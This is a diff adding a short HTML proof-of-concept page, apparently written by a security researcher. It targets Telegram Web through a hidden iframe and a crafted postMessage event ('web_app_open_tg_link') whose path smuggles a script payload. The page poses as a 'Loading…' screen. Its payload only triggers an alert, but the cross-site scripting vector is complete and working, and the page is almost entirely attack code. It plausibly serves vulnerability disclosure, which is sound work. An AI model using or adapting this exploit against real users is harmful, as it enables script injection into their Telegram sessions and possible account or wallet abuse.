@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>Loading…</h1>
+    <iframe id="tg_frame" src="https://web.telegram.org/a/" style="display:none;"></iframe>
+    <script>
+      const payload = JSON.stringify({
+        eventType: 'web_app_open_tg_link',
+        eventData: {
+          path_full: `/wallet/start?x=${encodeURIComponent("alert('XSS by Suraj')")}`
+        }
+      });
+
+      window.onload = function () {
+        const iframe = document.getElementById("tg_frame");
+        iframe.onload = function () {
+          iframe.contentWindow.postMessage(payload, "*");
+        };
+      };
+    </script>
+  </body>
+</html>
